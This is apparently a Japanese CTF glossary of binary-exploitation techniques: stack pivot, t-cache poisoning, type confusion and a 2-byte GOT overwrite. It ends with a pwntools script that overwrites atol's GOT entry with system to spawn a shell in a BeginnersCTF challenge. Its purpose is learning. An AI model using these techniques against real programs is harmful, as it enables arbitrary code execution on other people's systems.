# pwn辞書
abcdefghijklmnopqrstuvwxyz

### double free
to be editing...  

### stack pivot
espまたはrspを任意の値に変更する（例えば攻撃者が入力可能なbuffのアドレス)ことで，pop,retなどのスタックを使う命令において，任意の値で操作することができる．  

### t-cache poisoning
詳細 => [t-cache poisoning: FireShell CTF 2019 babyheap](https://furutsuki.hatenablog.com/entry/2019/02/26/112207)  
heapにおいてt-cacheの指すアドレスを任意のアドレス値にすることで，次に同じ大きさのチャンクを要求したとき，t-cacheが優先されることで攻撃者が指定したアドレスが返り値として帰ってしまい，任意アドレスの内容を編集することができる攻撃手法．  
GOT overwriteと組み合わせて使用することが多い（と思ふ）．（t-cacheに変更したいGOTのアドレス，malloc後のデータ書き込み時にsystemやone_gadgetなどのshellを呼ぶ事のできるアドレスを指定．）

### type confusion
本来の変数の型と違う型で，その変数を操作することができる脆弱性．  
配列（char *）型と整数（int）型の間でtype confusionが存在すると，任意アドレスの値を出力，書き換えなどの攻撃が可能となってしまう．

## 名前はわからないが使えそうなテク集
### GOT下位2Byte書き換え
libcリークしなくてもlibcの任意の関数を書き込める可能性がある  

条件: 書き込み元のアドレスがlibcにあること，任意アドレスに書込み可能であること（2Byte）  
方法: GOTのlibc関数の下位2Byteを，libcのアドレスに書き換える  
例（BeginnersCTF.elemententary_stack):
```
"""
  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
  1733: 00000000000406a0    12 FUNC    GLOBAL DEFAULT   13 atol@@GLIBC_2.2.5
"""
from pwn import *

elf = ELF("./chall")
libc = ELF("./libc.so.6")
p = process("./chall")

# GOT overwrite
# *buf = atol-8 (malloc)
p.sendlineafter("index: ", "-2" )
p.sendlineafter("value: ", str(elf.got["atol"] - 0x08) )

# write system function to atol( 2Byte )
# atol( value ) => system( value )
p.sendafter("index: ", "0" )  #avoid 64bit alignment
p.sendafter("value: ", b"/bin/sh\0" + p64(libc.symbols["system"])[:2] )

p.interactive()

```
